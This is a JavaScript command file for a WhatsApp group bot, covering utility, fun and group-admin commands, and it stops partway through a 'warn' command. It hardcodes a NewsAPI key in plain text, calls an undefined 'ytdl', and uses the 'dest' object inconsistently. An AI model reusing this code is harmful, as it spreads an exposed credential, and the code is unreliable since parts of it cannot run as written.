const { hango } = require("../framework/hango");
const conf = require(__dirname + "/../set");
const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const net = require('net');

hango({
  nomCom: "timezone",
  aliases: ["timee", "datee"],
  desc: "Check the current local time and date for a specified timezone.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const timezone = arg[0];

  if (!timezone) {
    return repondre("❌ Please provide a timezone code. Example: .timezone TZ");
  }

  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time and date in the specified timezone
    const options = { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true, 
      timeZone: timezone 
    };

    const timeOptions = { 
      ...options, 
      weekday: "long", 
      year: "numeric", 
      month: "long", 
      day: "numeric" 
    };

    const localTime = now.toLocaleTimeString("en-US", options);
    const localDate = now.toLocaleDateString("en-US", timeOptions);

    // Send the local time and date as reply
    repondre(`🕰️ *Current Local Time:* ${localTime}\n📅 *Current Date:* ${localDate}`);
  } catch (e) {
    console.error("Error in .timezone command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "color",
  aliases: ["rcolor", "colorcode"],
  desc: "Generate a random color with name and code.",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const colorNames = [
      "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Pink", "Brown", "Black", "White", 
      "Gray", "Cyan", "Magenta", "Violet", "Indigo", "Teal", "Lavender", "Turquoise"
    ];
    
    const randomColorHex = "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
    const randomColorName = colorNames[Math.floor(Math.random() * colorNames.length)];

    repondre(`🎨 *Random Color:* \nName: ${randomColorName}\nCode: ${randomColorHex}`);
  } catch (e) {
    console.error("Error in .color command:", e);
    repondre("❌ An error occurred while generating the random color.");
  }
});

hango({
  nomCom: "binary",
  aliases: ["binarydgt", "binarycode"],
  desc: "Convert text into binary format",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre('Please provide a text to convert to binary.');
  }

  try {
    const binaryText = text.split('').map(char => {
      return `00000000${char.charCodeAt(0).toString(2)}`.slice(-8);
    }).join(' ');

    repondre(`🔑 *Binary Representation:* \n${binaryText}`);
  } catch (e) {
    console.error("Error in .binary command:", e);
    repondre("❌ An error occurred while converting to binary.");
  }
});

hango({
  nomCom: "dbinary",
  aliases: ["binarydecode", "decodebinary"],
  desc: "Decode binary string into text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre("❌ Please provide the binary string to decode.");
  }

  try {
    const binaryString = text;
    const textDecoded = binaryString.split(' ').map(bin => {
      return String.fromCharCode(parseInt(bin, 2));
    }).join('');

    repondre(`🔓 *Decoded Text:* \n${textDecoded}`);
  } catch (e) {
    console.error("Error in .dbinary command:", e);
    repondre("❌ An error occurred while decoding the binary string.");
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

hango({
  nomCom: "pick",
  aliases: ["choose", "select"],
  desc: "Pick between two choices.",
  categorie: "fun",
  reaction: '🚚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure two options are provided
  if (!text.includes(',')) {
    return repondre("❌ Please provide two choices to pick from. Example: `.pick Ice Cream, Pizza`");
  }

  try {
    // Pick a random option
    const options = text.split(',').map(option => option.trim());
    const choice = options[Math.floor(Math.random() * options.length)];

    // Send the result
    repondre(`🎉 Bot picks: *${choice}*`);
  } catch (e) {
    console.error("Error in .pick command:", e);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "timenow",
  aliases: ["currenttime", "time"],
  desc: "Check the current local time.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time in the configured timezone
    const localTime = now.toLocaleTimeString("en-US", { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true,
      timeZone: conf.TIMEZONE, // Using the configured timezone from set.js
    });
    
    // Send the local time as reply
    repondre(`🕒 Current Local Time: ${localTime}`);
  } catch (e) {
    console.error("Error in .timenow command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "date",
  aliases: ["currentdate", "todaydate"],
  desc: "Check the current date.",
  categorie: "new",
  reaction: '📆',
}, async (dest, hn, context) => {
  const { repondre } = context;

  try {
    // Get current date
    const now = new Date();
    
    // Get the formatted date (e.g., "Monday, January 15, 2025")
    const currentDate = now.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    
    // Send the current date as reply
    repondre(`📅 Current Date: ${currentDate}`);
  } catch (e) {
    console.error("Error in .date command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "calculate2",
  aliases: ["calcu", "maths", "mathema"],
  desc: "Evaluate a mathematical expression.",
  categorie: "new",
  reaction: '🧮',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure arguments are provided
  if (!text) {
    return repondre("🧮 Use this command like:\n *Example:* .calculate 5+3*2");
  }

  // Validate the input to prevent unsafe operations
  if (!/^[0-9+\-*/().\s]+$/.test(text)) {
    return repondre("❎ Invalid expression. Only numbers and +, -, *, /, ( ) are allowed.");
  }

  try {
    // Evaluate the mathematical expression
    let result = eval(text);

    // Reply with the result
    repondre(`✅ Result of "${text}" is: ${result}`);
  } catch (e) {
    console.error("Error in .calculate command:", e);
    repondre("❎ Error in calculation. Please check your expression.");
  }
});

hango({
  nomCom: "emojify",
  aliases: ["emoji", "txtemoji"],
  desc: "Convert text into emoji form.",
  categorie: "fun",
  reaction: '🙂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // If no valid text is provided
  if (!text) {
    return repondre("❌ Please provide some text to convert into emojis!");
  }

  try {
    // Map text to corresponding emoji characters
    const emojiMapping = {
      "a": "🅰️",
      "b": "🅱️",
      "c": "🇨️",
      "d": "🇩️",
      "e": "🇪️",
      "f": "🇫️",
      "g": "🇬️",
      "h": "🇭️",
      "i": "🇮️",
      "j": "🇯️",
      "k": "🇰️",
      "l": "🇱️",
      "m": "🇲️",
      "n": "🇳️",
      "o": "🅾️",
      "p": "🇵️",
      "q": "🇶️",
      "r": "🇷️",
      "s": "🇸️",
      "t": "🇹️",
      "u": "🇺️",
      "v": "🇻️",
      "w": "🇼️",
      "x": "🇽️",
      "y": "🇾️",
      "z": "🇿️",
      "0": "0️⃣",
      "1": "1️⃣",
      "2": "2️⃣",
      "3": "3️⃣",
      "4": "4️⃣",
      "5": "5️⃣",
      "6": "6️⃣",
      "7": "7️⃣",
      "8": "8️⃣",
      "9": "9️⃣",
      " ": "␣" // for space
    };

    // Convert the input text into emoji form
    const emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

    await hn.sendMessage(dest, {
      text: emojiText,
    }, { quoted: context.ms });

  } catch (e) {
    console.error("Error in .emoji command:", e);
    repondre(`❌ Error: ${e.message}`);
  }
});

hango({
  nomCom: "news2",
  aliases: ["latestnews", "newsheadlines"],
  desc: "Get the latest news headlines.",
  categorie: "AI",
  reaction: '🗞️',
}, async (dest, hn, context) => {
  const { repondre, from } = context;

  try {
    const apiKey = "0f2c43ab11324578a7b1709651736382";
    const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
    const articles = response.data.articles;

    if (!articles.length) {
      return repondre("No news articles found.");
    }

    // Send each article as a separate message with image and title
    for (let i = 0; i < Math.min(articles.length, 5); i++) {
      const article = articles[i];
      let message = `
📰 *${article.title}*
📝 _${article.description}_
🔗 _${article.url}_

> © Powered by ${conf.BOT}
      `;

      console.log('Article URL:', article.urlToImage); // Log image URL for debugging

      if (article.urlToImage) {
        // Send image with caption
        await hn.sendMessage(dest, { image: { url: article.urlToImage }, caption: message });
      } else {
        // Send text message if no image is available
        await hn.sendMessage(dest, { text: message });
      }
    }
  } catch (e) {
    console.error("Error fetching news:", e);
    repondre("Could not fetch news. Please try again later.");
  }
});

hango({
  nomCom: "groupinfo",
  aliases: ["ginfo", "infogroup"],
  desc: "Get detailed information about the current group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    
    // Count admins
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    
    // Format creation date
    const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    // Create group info message
    const infoMessage = `
📊 *GROUP INFORMATION*
📝 *Name:* ${groupMetadata.subject}
👥 *Members:* ${participants.length}
👑 *Admins:* ${adminCount}
🆔 *Group ID:* ${dest.chat}
📅 *Created On:* ${creationDate}
${groupMetadata.desc ? `📄 *Description:* ${groupMetadata.desc}` : ''}
    `;
    
    await repondre(infoMessage);
  } catch (error) {
    console.error("Error in groupinfo command:", error);
    await repondre("❌ An error occurred while fetching group information.");
  }
});

hango({
  nomCom: "tagall",
  aliases: ["mentionall", "everyone"],
  desc: "Tag all members in the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    const isAdmin = participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Attention everyone!";
    
    // Create mentions array and message
    const mentions = participants.map(p => p.id);
    let mentionText = `📢 *${message}*\n\n`;
    
    participants.forEach(participant => {
      mentionText += `@${participant.id.split('@')[0]}\n`;
    });
    
    await hn.sendMessage(dest.chat, {
      text: mentionText,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in tagall command:", error);
    await repondre("❌ An error occurred while tagging group members.");
  }
});

hango({
  nomCom: "promote",
  aliases: ["makeadmin", "admin"],
  desc: "Promote a member to admin",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to promote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is already admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ This user is already an admin.");
    }
    
    // Promote the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "promote");
    
    await repondre(`👑 User @${targetId.split('@')[0]} has been promoted to admin.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in promote command:", error);
    await repondre("❌ An error occurred while promoting the member.");
  }
});

hango({
  nomCom: "demote",
  aliases: ["removeadmin", "unadmin"],
  desc: "Demote an admin to member",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag an admin to demote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isTargetAdmin) {
      return repondre("❌ This user is not an admin.");
    }
    
    // Demote the admin
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "demote");
    
    await repondre(`👤 User @${targetId.split('@')[0]} has been demoted to member.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in demote command:", error);
    await repondre("❌ An error occurred while demoting the admin.");
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use a YouTube download service API
    const ytDlUrl = `https://loader.to/api/button/?url=${encodeURIComponent(url)}&f=mp3`;
    
    // Get video info
    const info = await ytdl.getInfo(url);
    const videoTitle = info.videoDetails.title;
    const thumbnail = info.videoDetails.thumbnails[0].url;
    
    // Send audio with thumbnail
    await hn.sendMessage(dest.chat, {
      audio: { url: ytDlUrl },
      mimetype: 'audio/mpeg',
      fileName: `${videoTitle}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: videoTitle,
          body: "YouTube MP3",
          thumbnailUrl: thumbnail,
          sourceUrl: url
        }
      }
    });
    
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    await repondre("❌ An error occurred while downloading the audio.");
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
